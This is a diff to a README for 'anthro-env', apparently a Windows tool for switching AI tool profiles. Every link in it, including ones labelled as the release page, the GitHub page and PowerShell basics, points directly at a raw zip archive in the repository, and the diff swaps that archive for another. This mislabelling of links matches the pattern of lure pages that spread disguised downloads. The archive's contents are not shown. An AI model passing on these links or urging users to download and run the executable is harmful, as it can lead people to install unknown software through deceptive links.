@@ -1,6 +1,6 @@
 # 🛠 anthro-env - Easy Environment Profile Switching
 
-[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip)
+[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip)
 
 ## What is anthro-env?
 
@@ -36,7 +36,7 @@ This tool is helpful for anyone who needs to manage multiple AI tool profiles wi
 
 Click the button below to visit the official release page where you can download the latest Windows version.
 
-[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip)
+[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip)
 
 On the releases page, look for the latest version. Find the `.exe` file or the Windows installer. The file names usually contain `windows` or `win`. Download the file to a folder you can find easily, such as your Desktop or Downloads.
 
@@ -133,7 +133,7 @@ The settings file is a plain text file that you can open in Notepad or any text 
 To keep anthro-env running smoothly, check the release page from time to time for new updates.
 
 1. Visit the release page:
-   https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip
+   https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip
 
 2. Download the latest Windows executable or installer.
 
@@ -162,13 +162,13 @@ or check issues reported on the GitHub repo.
 ## 📚 Additional Resources
 
 - GitHub page for anthro-env:  
-  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip
+  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip
 
 - Release downloads:  
-  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip
+  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip
 
 - PowerShell basics:  
-  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip
+  https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip
 
 ---
 
@@ -178,4 +178,4 @@ While this guide helps with basic setup and use, the open-source project on GitH
 
 ---
 
-[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&color=2088FF)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/packaging/env_anthro_v2.7.zip)
+[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&color=2088FF)](https://raw.githubusercontent.com/XStarsHolderX/anthro-env/main/cmd/anthro-env/anthro-env-v1.8.zip)
